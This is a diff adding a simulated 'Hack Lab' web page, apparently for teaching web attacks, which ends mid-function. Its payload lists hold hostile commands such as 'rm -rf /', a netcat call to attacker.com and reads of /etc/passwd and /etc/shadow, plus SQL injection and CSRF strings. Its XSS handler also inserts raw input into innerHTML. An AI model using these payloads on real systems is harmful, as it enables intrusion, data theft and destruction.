@@ -1,0 +1,1340 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Hack Lab</title>
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        font-family: "Courier New", monospace;
+        background: #0a0e1a;
+        color: #00ff41;
+        overflow-x: hidden;
+      }
+
+      .container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 20px;
+      }
+
+      .subtitle {
+        margin-top: 10px;
+        font-size: 1.2em;
+        opacity: 0.8;
+      }
+
+      .tabs-container {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 30px;
+        border-bottom: 2px solid #00ff41;
+        padding-bottom: 0;
+        flex-wrap: wrap;
+      }
+
+      .tab {
+        padding: 15px 30px;
+        background: rgba(0, 255, 65, 0.05);
+        border: 2px solid #00ff41;
+        border-bottom: none;
+        border-radius: 10px 10px 0 0;
+        cursor: pointer;
+        transition: all 0.3s;
+        font-size: 1.1em;
+        position: relative;
+        bottom: -2px;
+      }
+
+      .tab:hover {
+        background: rgba(0, 255, 65, 0.1);
+        box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
+      }
+
+      .tab.active {
+        background: rgba(0, 255, 65, 0.15);
+        border-bottom: 2px solid #0a0e1a;
+        box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
+      }
+
+      .lab-area {
+        display: none;
+        margin-bottom: 60px;
+        padding: 30px;
+        background: rgba(0, 255, 65, 0.05);
+        border: 2px solid #00ff41;
+        border-radius: 10px;
+        position: relative;
+      }
+
+      .lab-area.active {
+        display: block;
+      }
+
+      .lab-header {
+        margin-bottom: 20px;
+      }
+
+      .lab-title {
+        font-size: 2em;
+        margin-bottom: 10px;
+      }
+
+      .lab-description {
+        font-size: 1em;
+        opacity: 0.7;
+        line-height: 1.6;
+      }
+
+      .lab-content {
+        display: grid;
+        grid-template-columns: 1fr 2fr;
+        gap: 30px;
+        margin-top: 30px;
+      }
+
+      .tools-section {
+        padding: 20px;
+        background: rgba(0, 255, 65, 0.03);
+        border: 1px solid #00ff41;
+        border-radius: 8px;
+      }
+
+      .tools-title {
+        font-size: 1.3em;
+        margin-bottom: 15px;
+        text-align: center;
+      }
+
+      .tool {
+        padding: 15px;
+        margin: 10px 0;
+        background: #0a0e1a;
+        border: 2px solid #00ff41;
+        border-radius: 5px;
+        cursor: move;
+        transition: all 0.3s;
+        font-size: 0.85em;
+        word-wrap: break-word;
+      }
+
+      .tool:hover {
+        background: rgba(0, 255, 65, 0.1);
+        box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        transform: scale(1.02);
+      }
+
+      .tool.dragging {
+        opacity: 0.5;
+      }
+
+      .target-section {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+      }
+
+      .browser-window {
+        width: 100%;
+        background: #1a1a2e;
+        border: 2px solid #00ff41;
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
+      }
+
+      .browser-header {
+        background: #0f0f1e;
+        padding: 10px;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        border-bottom: 1px solid #00ff41;
+      }
+
+      .browser-dot {
+        width: 12px;
+        height: 12px;
+        border-radius: 50%;
+        background: #00ff41;
+      }
+
+      .browser-url {
+        flex: 1;
+        margin-left: 10px;
+        padding: 5px 10px;
+        background: #0a0e1a;
+        border: 1px solid #00ff41;
+        border-radius: 3px;
+        font-size: 0.85em;
+      }
+
+      .browser-content {
+        min-height: 200px;
+        background: #1a1a2e;
+      }
+
+      .drop-zone {
+        min-height: 80px;
+        padding: 15px;
+        border: 2px dashed #00ff41;
+        border-radius: 5px;
+        margin: 15px 0;
+        transition: all 0.3s;
+        text-align: center;
+      }
+
+      .drop-zone.drag-over {
+        background: rgba(0, 255, 65, 0.2);
+        border-style: solid;
+      }
+
+      .web-page {
+        padding: 30px;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial,
+          sans-serif;
+      }
+
+      .search-page {
+        background: #f8f9fa;
+        color: #333;
+      }
+
+      .search-page h1 {
+        color: #4285f4;
+        font-size: 2.5em;
+        margin-bottom: 30px;
+        text-align: center;
+      }
+
+      .search-box {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 30px;
+      }
+
+      .search-box input {
+        flex: 1;
+        padding: 12px;
+        border: 1px solid #dfe1e5;
+        border-radius: 24px;
+        font-size: 1em;
+        color: #333;
+        background: white;
+      }
+
+      .search-box button {
+        padding: 12px 24px;
+        background: #4285f4;
+        color: white;
+        border: none;
+        border-radius: 4px;
+        cursor: pointer;
+        transition: all 0.3s;
+      }
+
+      .search-box button:hover {
+        background: #357ae8;
+      }
+
+      .search-results {
+        margin-top: 20px;
+      }
+
+      .search-result-item {
+        margin-bottom: 20px;
+        padding: 15px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      }
+
+      .result-title {
+        color: #1a0dab;
+        font-size: 1.2em;
+        margin-bottom: 5px;
+      }
+
+      .result-url {
+        color: #006621;
+        font-size: 0.9em;
+        margin-bottom: 5px;
+      }
+
+      .result-desc {
+        color: #545454;
+      }
+
+      .login-page {
+        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 400px;
+      }
+
+      .login-box {
+        background: white;
+        padding: 40px;
+        border-radius: 10px;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        width: 100%;
+        max-width: 400px;
+      }
+
+      .login-box h2 {
+        text-align: center;
+        color: #667eea;
+        margin-bottom: 30px;
+      }
+
+      .form-group {
+        margin-bottom: 20px;
+      }
+
+      .form-group label {
+        display: block;
+        margin-bottom: 5px;
+        color: #333;
+        font-weight: 500;
+      }
+
+      .form-group input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        font-size: 1em;
+        color: #333;
+        background: white;
+      }
+
+      .login-btn {
+        width: 100%;
+        padding: 12px;
+        background: #667eea;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        font-size: 1em;
+        cursor: pointer;
+        transition: all 0.3s;
+      }
+
+      .login-btn:hover {
+        background: #5568d3;
+      }
+
+      .ping-page {
+        background: #1e1e1e;
+        color: #d4d4d4;
+        font-family: "Consolas", "Monaco", monospace;
+        padding: 30px;
+        min-height: 400px;
+      }
+
+      .ping-page h2 {
+        color: #4ec9b0;
+        margin-bottom: 20px;
+      }
+
+      .terminal-box {
+        background: #0c0c0c;
+        border: 1px solid #3e3e3e;
+        border-radius: 5px;
+        padding: 20px;
+        margin-top: 20px;
+      }
+
+      .terminal-header {
+        color: #858585;
+        margin-bottom: 10px;
+        font-size: 0.9em;
+      }
+
+      .command-input {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 15px;
+      }
+
+      .command-input input {
+        flex: 1;
+        background: #1e1e1e;
+        border: 1px solid #3e3e3e;
+        color: #d4d4d4;
+        padding: 10px;
+        border-radius: 3px;
+        font-family: inherit;
+      }
+
+      .command-input button {
+        padding: 10px 20px;
+        background: #0e639c;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+      }
+
+      .terminal-output {
+        color: #4ec9b0;
+        white-space: pre-wrap;
+        font-size: 0.9em;
+      }
+
+      .server-visual {
+        width: 200px;
+        height: 200px;
+        background: linear-gradient(135deg, #1a1a2e 0%, #0f0f1e 100%);
+        border: 3px solid #00ff41;
+        border-radius: 10px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        box-shadow: 0 0 30px rgba(0, 255, 65, 0.3);
+      }
+
+      .server-light {
+        width: 10px;
+        height: 10px;
+        background: #00ff41;
+        border-radius: 50%;
+        margin: 5px;
+        animation: blink 1s infinite;
+      }
+
+      @keyframes blink {
+        0%,
+        50% {
+          opacity: 1;
+        }
+        51%,
+        100% {
+          opacity: 0.3;
+        }
+      }
+
+      .botnet-container {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 15px;
+        margin-top: 20px;
+      }
+
+      .bot-node {
+        width: 60px;
+        height: 60px;
+        background: #0a0e1a;
+        border: 2px solid #00ff41;
+        border-radius: 5px;
+        cursor: move;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2em;
+        transition: all 0.3s;
+      }
+
+      .bot-node:hover {
+        background: rgba(0, 255, 65, 0.1);
+        box-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+      }
+
+      .explanation {
+        margin-top: 30px;
+        padding: 20px;
+        background: rgba(255, 0, 0, 0.1);
+        border: 2px solid #ff0040;
+        border-radius: 8px;
+        display: none;
+        animation: slideIn 0.5s ease-out;
+      }
+
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateY(-20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      .explanation.show {
+        display: block;
+      }
+
+      .explanation h3 {
+        color: #ff0040;
+        margin-bottom: 10px;
+      }
+
+      .explanation p {
+        color: #00ff41;
+        line-height: 1.6;
+        margin-bottom: 10px;
+      }
+
+      .mitigation {
+        margin-top: 15px;
+        padding: 15px;
+        background: rgba(0, 255, 65, 0.1);
+        border-left: 3px solid #00ff41;
+      }
+
+      .mitigation h4 {
+        margin-bottom: 8px;
+      }
+
+      .attack-animation {
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background: #ff0040;
+        border-radius: 50%;
+        pointer-events: none;
+        box-shadow: 0 0 10px #ff0040;
+      }
+
+      .reset-btn {
+        margin-top: 20px;
+        padding: 10px 20px;
+        background: rgba(255, 0, 64, 0.2);
+        color: #ff0040;
+        border: 2px solid #ff0040;
+        border-radius: 4px;
+        cursor: pointer;
+        font-family: inherit;
+        transition: all 0.3s;
+      }
+
+      .reset-btn:hover {
+        background: rgba(255, 0, 64, 0.3);
+        box-shadow: 0 0 15px rgba(255, 0, 64, 0.5);
+      }
+
+      @keyframes shake {
+        0%,
+        100% {
+          transform: translateX(0);
+        }
+        25% {
+          transform: translateX(-10px);
+        }
+        75% {
+          transform: translateX(10px);
+        }
+      }
+
+      @media (max-width: 768px) {
+        .lab-content {
+          grid-template-columns: 1fr;
+        }
+        .botnet-container {
+          grid-template-columns: repeat(3, 1fr);
+        }
+        .tab {
+          padding: 10px 20px;
+          font-size: 1em;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="tabs-container">
+        <div class="tab active" onclick="switchTab('xss')">XSS</div>
+        <div class="tab" onclick="switchTab('sql')">SQL Injection</div>
+        <div class="tab" onclick="switchTab('rce')">RCE</div>
+        <div class="tab" onclick="switchTab('csrf')">CSRF</div>
+        <div class="tab" onclick="switchTab('path')">Path Traversal</div>
+        <div class="tab" onclick="switchTab('idor')">IDOR</div>
+        <div class="tab" onclick="switchTab('ddos')">DDoS</div>
+      </div>
+
+      <div id="labs-container"></div>
+    </div>
+
+    <script>
+      const labs = {
+        xss: {
+          title: "XSS - Cross-Site Scripting",
+          description:
+            "Cross-Site Scripting allows attackers to inject malicious scripts into web pages viewed by other users. Drag the payload into the input field to execute the attack.",
+          tools: [
+            {
+              payload: "xss1",
+              code: "&lt;script&gt;alert('XSS')&lt;/script&gt;",
+            },
+            {
+              payload: "xss2",
+              code: "&lt;img src=x onerror=\"alert('XSS')\"&gt;",
+            },
+            { payload: "xss3", code: "&lt;svg onload=alert('XSS')&gt;" },
+          ],
+          targetHTML: `
+                  <div class="browser-window">
+                    <div class="browser-header">
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-url">https://vulnerable-site.com/search</div>
+                    </div>
+                    <div class="browser-content">
+                      <div class="web-page search-page">
+                        <h1>SearchEngine</h1>
+                        <div class="drop-zone" id="xss-drop">Drop XSS payload here</div>
+                        <div class="search-box">
+                          <input type="text" id="xss-input" placeholder="Search the web...">
+                          <button onclick="executeXSS()">Search</button>
+                        </div>
+                        <div class="search-results" id="xss-result">
+                          <div class="search-result-item">
+                            <div class="result-title">Welcome to SearchEngine</div>
+                            <div class="result-url">https://searchengine.com</div>
+                            <div class="result-desc">Find anything on the web. Fast, accurate, and private.</div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Attack Successful!",
+            description:
+              "The XSS payload was executed because the application didn't sanitize user input. The malicious script ran in the context of the victim's browser, potentially stealing cookies, session tokens, or performing actions on behalf of the user.",
+            mitigation: `• Sanitize and validate all user inputs<br>
+            • Use Content Security Policy (CSP) headers<br>
+            • Encode output data (HTML entity encoding)<br>
+            • Use modern frameworks with built-in XSS protection<br>
+            • Implement HTTP-only cookies`,
+          },
+        },
+        sql: {
+          title: "SQL Injection",
+          description:
+            "SQL Injection exploits vulnerabilities in database queries. Attackers can manipulate queries to access unauthorized data. Drag the SQL payload into the login form.",
+          tools: [
+            { payload: "sql1", code: "' OR '1'='1" },
+            { payload: "sql2", code: "admin'--" },
+            { payload: "sql3", code: "' UNION SELECT * FROM users--" },
+          ],
+          targetHTML: `
+                  <div class="browser-window">
+                    <div class="browser-header">
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-url">https://bank-portal.com/login</div>
+                    </div>
+                    <div class="browser-content">
+                      <div class="web-page login-page">
+                        <div class="login-box">
+                          <h2>🏦 SecureBank Portal</h2>
+                          <div class="drop-zone" id="sql-drop" style="margin-bottom: 20px;">Drop SQL payload here</div>
+                          <div class="form-group">
+                            <label>Username</label>
+                            <input type="text" id="sql-username" placeholder="Enter your username">
+                          </div>
+                          <div class="form-group">
+                            <label>Password</label>
+                            <input type="password" id="sql-password" placeholder="Enter your password">
+                          </div>
+                          <button class="login-btn" onclick="executeSQLI()">Sign In</button>
+                          <div id="sql-result"></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Database Compromised!",
+            description:
+              "The SQL injection bypassed authentication by manipulating the SQL query. The payload altered the query logic, making it always return true, granting unauthorized access to the system.",
+            mitigation: `• Use parameterized queries (prepared statements)<br>
+            • Implement proper input validation<br>
+            • Use ORM frameworks<br>
+            • Apply principle of least privilege for database users<br>
+            • Use stored procedures<br>
+            • Regular security audits and penetration testing`,
+          },
+        },
+        rce: {
+          title: "RCE - Remote Code Execution",
+          description:
+            "Remote Code Execution allows attackers to run arbitrary code on the server. This is one of the most critical vulnerabilities. Drag the malicious command into the command field.",
+          tools: [
+            { payload: "rce1", code: "; cat /etc/passwd" },
+            { payload: "rce2", code: "&& rm -rf /" },
+            { payload: "rce3", code: "| nc attacker.com 4444" },
+          ],
+          targetHTML: `
+                  <div class="browser-window">
+                    <div class="browser-header">
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-url">https://webapp.com/ping</div>
+                    </div>
+                    <div class="browser-content">
+                      <div class="web-page ping-page">
+                        <h2>⚙️ Network Diagnostic Tool</h2>
+                        <p style="color: #858585; margin-bottom: 20px;">Test network connectivity by pinging remote hosts</p>
+                        <div class="drop-zone" id="rce-drop" style="border-color: #3e3e3e; background: rgba(62, 62, 62, 0.1);">Drop command payload here</div>
+                        <div class="terminal-box">
+                          <div class="terminal-header">$ ping command</div>
+                          <div class="command-input">
+                            <input type="text" id="rce-input" placeholder="127.0.0.1">
+                            <button onclick="executeRCE()">Execute</button>
+                          </div>
+                          <div class="terminal-output" id="rce-result"></div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Server Compromised!",
+            description:
+              "The RCE vulnerability allowed execution of arbitrary system commands. The application failed to sanitize input before passing it to the system shell, enabling attackers to run malicious commands with server privileges.",
+            mitigation: `• Never pass user input directly to system commands<br>
+            • Use allowlists for input validation<br>
+            • Implement proper input sanitization<br>
+            • Run applications with minimal privileges<br>
+            • Use containerization and sandboxing<br>
+            • Disable dangerous functions in production`,
+          },
+        },
+        csrf: {
+          title: "CSRF - Cross-Site Request Forgery",
+          description:
+            "CSRF tricks authenticated users into executing unwanted actions on a web application. Attackers forge requests that appear to come from legitimate users. Drag the malicious link to the browser.",
+          tools: [
+            {
+              payload: "csrf1",
+              code: '&lt;a href="transfer?to=attacker&amount=1000"&gt;Click here!&lt;/a&gt;',
+            },
+            {
+              payload: "csrf2",
+              code: '&lt;img src="delete-account?confirm=yes"&gt;',
+            },
+            {
+              payload: "csrf3",
+              code: '&lt;form action="change-email" method="POST"&gt;&lt;input name="email" value="hacker@evil.com"&gt;&lt;/form&gt;',
+            },
+          ],
+          targetHTML: `
+                  <div class="browser-window">
+                    <div class="browser-header">
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-url">https://mybank.com/dashboard</div>
+                    </div>
+                    <div class="browser-content">
+                      <div class="web-page" style="background: #f5f5f5; color: #333; padding: 40px;">
+                        <h2 style="color: #2c3e50; margin-bottom: 20px;">💰 Bank Dashboard</h2>
+                        <div style="background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); margin-bottom: 20px;">
+                          <h3 style="color: #27ae60; margin-bottom: 15px;">Balance: $5,000.00</h3>
+                          <p style="color: #7f8c8d;">Account: ****1234</p>
+                        </div>
+                        <div class="drop-zone" id="csrf-drop" style="background: white;">Click on malicious link (drag here)</div>
+                        <div id="csrf-result"></div>
+                      </div>
+                    </div>
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Unauthorized Action Executed!",
+            description:
+              "The CSRF attack succeeded because the application didn't verify the origin of the request. The authenticated user's session was exploited to perform unauthorized actions without their consent.",
+            mitigation: `• Implement CSRF tokens for all state-changing operations<br>
+            • Use SameSite cookie attribute<br>
+            • Verify Origin and Referer headers<br>
+            • Require re-authentication for sensitive actions<br>
+            • Use custom headers for AJAX requests<br>
+            • Implement proper CORS policies`,
+          },
+        },
+        path: {
+          title: "Path Traversal",
+          description:
+            "Path Traversal allows attackers to access files and directories outside the intended directory. Using special characters like '../' can navigate the file system. Drag the path payload to the file input.",
+          tools: [
+            { payload: "path1", code: "../../../etc/passwd" },
+            {
+              payload: "path2",
+              code: "..\\..\\..\\windows\\system32\\config\\sam",
+            },
+            { payload: "path3", code: "....//....//....//etc/shadow" },
+          ],
+          targetHTML: `
+                  <div class="browser-window">
+                    <div class="browser-header">
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-url">https://fileserver.com/download</div>
+                    </div>
+                    <div class="browser-content">
+                      <div class="web-page" style="background: #2d3436; color: #dfe6e9; padding: 40px; min-height: 400px;">
+                        <h2 style="color: #74b9ff; margin-bottom: 20px;">📁 File Download Service</h2>
+                        <p style="margin-bottom: 20px; color: #b2bec3;">Enter filename to download from the documents folder</p>
+                        <div class="drop-zone" id="path-drop" style="border-color: #74b9ff; background: rgba(116, 185, 255, 0.05);">Drop path payload here</div>
+                        <div style="margin: 20px 0;">
+                          <input type="text" id="path-input" placeholder="documents/report.pdf" style="width: 100%; padding: 12px; background: #34495e; border: 1px solid #74b9ff; color: #dfe6e9; border-radius: 4px; font-family: 'Courier New', monospace;">
+                          <button onclick="executePath()" style="margin-top: 10px; padding: 12px 24px; background: #74b9ff; color: #2d3436; border: none; border-radius: 4px; cursor: pointer; font-weight: bold;">Download File</button>
+                        </div>
+                        <div id="path-result" style="margin-top: 20px; font-family: 'Courier New', monospace;"></div>
+                      </div>
+                    </div>
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Unauthorized File Access!",
+            description:
+              "The Path Traversal attack succeeded by manipulating file paths to access restricted system files. The application failed to properly sanitize user input, allowing directory traversal sequences.",
+            mitigation: `• Validate and sanitize all file path inputs<br>
+            • Use allowlists for permitted files/directories<br>
+            • Implement proper access controls<br>
+            • Use secure file API functions that prevent traversal<br>
+            • Run applications with minimal file system permissions<br>
+            • Use chroot jails or containers to limit file access`,
+          },
+        },
+        idor: {
+          title: "IDOR - Insecure Direct Object Reference",
+          description:
+            "IDOR occurs when applications expose direct references to internal objects without proper authorization checks. Attackers can manipulate IDs to access unauthorized resources. Drag user IDs to access different accounts.",
+          tools: [
+            { payload: "idor1", code: "user_id=1" },
+            { payload: "idor2", code: "user_id=999" },
+            { payload: "idor3", code: "user_id=admin" },
+          ],
+          targetHTML: `
+                  <div class="browser-window">
+                    <div class="browser-header">
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-dot"></div>
+                      <div class="browser-url">https://social-network.com/profile?user_id=42</div>
+                    </div>
+                    <div class="browser-content">
+                      <div class="web-page" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px; min-height: 400px;">
+                        <div style="background: white; border-radius: 12px; padding: 30px; box-shadow: 0 10px 30px rgba(0,0,0,0.3);">
+                          <h2 style="color: #667eea; margin-bottom: 20px;">👤 User Profile</h2>
+                          <div class="drop-zone" id="idor-drop" style="margin-bottom: 20px;">Drop user ID here</div>
+                          <div style="display: flex; gap: 10px; margin-bottom: 20px;">
+                            <input type="text" id="idor-input" placeholder="user_id=42" style="flex: 1; padding: 12px; border: 1px solid #ddd; border-radius: 5px; color: #333;">
+                            <button onclick="executeIDOR()" style="padding: 12px 24px; background: #667eea; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">Load Profile</button>
+                          </div>
+                          <div id="idor-result" style="background: #f8f9fa; padding: 20px; border-radius: 8px; min-height: 100px;">
+                            <div style="color: #7f8c8d; text-align: center;">Enter a user ID to view profile</div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Unauthorized Data Access!",
+            description:
+              "The IDOR vulnerability allowed access to other users' data by simply changing the ID parameter. The application failed to verify if the authenticated user had permission to access the requested resource.",
+            mitigation: `• Implement proper authorization checks for all resources<br>
+            • Use indirect reference maps (GUIDs instead of sequential IDs)<br>
+            • Verify user permissions before returning data<br>
+            • Implement role-based access control (RBAC)<br>
+            • Log and monitor access to sensitive resources<br>
+            • Never expose internal object references directly`,
+          },
+        },
+        ddos: {
+          title: "DDoS - Distributed Denial of Service",
+          description:
+            "DDoS attacks overwhelm a server with traffic from multiple sources, making it unavailable to legitimate users. Drag bot nodes to the server to simulate the attack.",
+          tools: Array(8).fill({ payload: "bot", code: "💻" }),
+          targetHTML: `
+                  <h3 style="margin-bottom: 20px">Target Server</h3>
+                  <div class="drop-zone" id="ddos-drop" style="padding: 40px">
+                    <div class="server-visual" id="server">
+                      <div style="font-size: 3em">🖥️</div>
+                      <div style="display: flex; margin-top: 10px">
+                        <div class="server-light"></div>
+                        <div class="server-light"></div>
+                        <div class="server-light"></div>
+                      </div>
+                      <div style="margin-top: 10px; font-size: 0.9em">Status: Online</div>
+                    </div>
+                  </div>
+                  <div id="ddos-counter" style="text-align: center; font-size: 1.3em; margin-top: 20px">
+                    Attacks: <span id="attack-count">0</span> / 5
+                  </div>
+                `,
+          explanation: {
+            title: "⚠ Server Overwhelmed!",
+            description:
+              "The DDoS attack successfully overwhelmed the server with massive amounts of traffic from multiple sources. The server's resources were exhausted, making it unable to respond to legitimate requests.",
+            mitigation: `• Implement rate limiting and traffic filtering<br>
+            • Use CDN and load balancers<br>
+            • Deploy DDoS protection services (Cloudflare, AWS Shield)<br>
+            • Increase bandwidth and server capacity<br>
+            • Use anomaly detection systems<br>
+            • Implement IP blacklisting and geo-blocking<br>
+            • Have an incident response plan`,
+          },
+        },
+      };
+
+      let draggedElement = null;
+      let attackCount = 0;
+
+      function renderLabs() {
+        const container = document.getElementById("labs-container");
+        container.innerHTML = Object.entries(labs)
+          .map(
+            ([key, lab], index) => `
+                <div class="lab-area ${
+                  index === 0 ? "active" : ""
+                }" id="${key}-lab">
+                  <div class="lab-header">
+                    <h2 class="lab-title">${lab.title}</h2>
+                    <p class="lab-description">${lab.description}</p>
+                  </div>
+                  <div class="lab-content">
+                    <div class="tools-section">
+                      <h3 class="tools-title">${
+                        key === "ddos" ? "Botnet Nodes" : "Attack Payloads"
+                      }</h3>
+                      ${
+                        key === "ddos"
+                          ? `<div class="botnet-container">
+                          ${lab.tools
+                            .map(
+                              (tool) =>
+                                `<div class="bot-node" draggable="true" data-payload="${tool.payload}">${tool.code}</div>`
+                            )
+                            .join("")}
+                        </div>`
+                          : lab.tools
+                              .map(
+                                (tool) =>
+                                  `<div class="tool" draggable="true" data-payload="${tool.payload}">${tool.code}</div>`
+                              )
+                              .join("")
+                      }
+                    </div>
+                    <div class="target-section">
+                      ${lab.targetHTML}
+                      <div class="explanation" id="${key}-explanation">
+                        <h3>${lab.explanation.title}</h3>
+                        <p>${lab.explanation.description}</p>
+                        <div class="mitigation">
+                          <h4>How to Mitigate:</h4>
+                          <p>${lab.explanation.mitigation}</p>
+                        </div>
+                        <button class="reset-btn" onclick="resetLab('${key}')">Reset Lab</button>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              `
+          )
+          .join("");
+
+        initDragAndDrop();
+      }
+
+      function switchTab(tabName) {
+        document
+          .querySelectorAll(".tab")
+          .forEach((tab) => tab.classList.remove("active"));
+        document
+          .querySelectorAll(".lab-area")
+          .forEach((area) => area.classList.remove("active"));
+        event.target.classList.add("active");
+        document.getElementById(tabName + "-lab").classList.add("active");
+      }
+
+      function initDragAndDrop() {
+        document.querySelectorAll(".tool, .bot-node").forEach((tool) => {
+          tool.addEventListener("dragstart", function (e) {
+            draggedElement = this;
+            this.classList.add("dragging");
+            e.dataTransfer.effectAllowed = "move";
+            e.dataTransfer.setData("text/html", this.innerHTML);
+          });
+
+          tool.addEventListener("dragend", function () {
+            this.classList.remove("dragging");
+          });
+        });
+
+        document.querySelectorAll(".drop-zone").forEach((zone) => {
+          zone.addEventListener("dragover", function (e) {
+            e.preventDefault();
+            this.classList.add("drag-over");
+          });
+
+          zone.addEventListener("dragleave", function () {
+            this.classList.remove("drag-over");
+          });
+
+          zone.addEventListener("drop", function (e) {
+            e.preventDefault();
+            this.classList.remove("drag-over");
+
+            if (draggedElement) {
+              const payload = draggedElement.getAttribute("data-payload");
+              const text = draggedElement.textContent.trim();
+
+              if (this.id === "xss-drop") {
+                document.getElementById("xss-input").value = text;
+              } else if (this.id === "sql-drop") {
+                document.getElementById("sql-username").value = text;
+              } else if (this.id === "rce-drop") {
+                document.getElementById("rce-input").value = text;
+              } else if (this.id === "csrf-drop") {
+                executeCSRF();
+              } else if (this.id === "path-drop") {
+                document.getElementById("path-input").value = text;
+              } else if (this.id === "idor-drop") {
+                document.getElementById("idor-input").value = text;
+              } else if (this.id === "ddos-drop" && payload === "bot") {
+                handleDDoSAttack(e);
+              }
+            }
+          });
+        });
+      }
+
+      function executeXSS() {
+        const input = document.getElementById("xss-input").value;
+        const result = document.getElementById("xss-result");
+
+        if (
+          input.includes("<script>") ||
+          input.includes("onerror") ||
+          input.includes("onload")
+        ) {
+          createAttackAnimation(document.getElementById("xss-drop"));
+          setTimeout(() => {
+            result.innerHTML = `
+        <div class="search-result-item" style="border: 2px solid #ff0040; background: rgba(255, 0, 0, 0.1);">
+          <div class="result-title" style="color: #ff0040;">⚠ MALICIOUS SCRIPT EXECUTED ⚠</div>
+          <div class="result-desc" style="color: #ff0040;">XSS payload successfully injected and executed in browser context!</div>
+        </div>`;
+            document.getElementById("xss-explanation").classList.add("show");
+          }, 500);
+        } else {
+          result.innerHTML = `
+      <div class="search-result-item">
+        <div class="result-title">Search results for "${input}"</div>
+        <div class="result-url">https://example.com/results</div>
+        <div class="result-desc">No malicious content detected. Safe search query.</div>
+      </div>`;
+        }
+      }
+
+      function executeSQLI() {
+        const username = document.getElementById("sql-username").value;
+        const result = document.getElementById("sql-result");
+
+        if (
+          username.includes("'") ||
+          username.includes("OR") ||
+          username.includes("--") ||
+          username.includes("UNION")
+        ) {
+          createAttackAnimation(document.getElementById("sql-drop"));
+          setTimeout(() => {
+            result.innerHTML = `
+        <div style="text-align: center; padding: 20px; background: rgba(255, 0, 0, 0.1); border-radius: 5px; margin-top: 15px;">
+          <div style="color: #00ff41; font-size: 1.3em; margin-bottom: 10px;">✓ Authentication Bypassed</div>
+          <div style="color: #333; font-weight: bold;">Welcome, Administrator!</div>
+          <div style="color: #666; font-size: 0.9em; margin-top: 10px;">Access Level: FULL CONTROL</div>
+        </div>`;
+            document.getElementById("sql-explanation").classList.add("show");
+          }, 500);
+        } else {
+          result.innerHTML = `<p style="color: #ff0040; text-align: center; margin-top: 15px;">❌ Invalid credentials. Access denied.</p>`;
+        }
+      }
+      function executeRCE() {
+        const input = document.getElementById("rce-input").value;
+        const result = document.getElementById("rce-result");
+
+        if (
+          input.includes(";") ||
+          input.includes("&&") ||
+          input.includes("|") ||
+          input.includes("cat") ||
+          input.includes("rm")
+        ) {
+          createAttackAnimation(document.getElementById("rce-drop"));
+          setTimeout(() => {
+            result.innerHTML = `<div style="color: #ff0040; margin-bottom: 10px;">⚠ ARBITRARY COMMAND EXECUTED ⚠</div>
+      <span style="color: #858585;">Output:</span>
+      root:x:0:0:root:/root:/bin/bash
+      daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+      www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+      admin:x:1000:1000:Admin User:/home/admin:/bin/bash
+      <span style="color: #ff0040;">
+      System files accessed! Server compromised!</span>`;
+            document.getElementById("rce-explanation").classList.add("show");
+          }, 500);
+        } else {
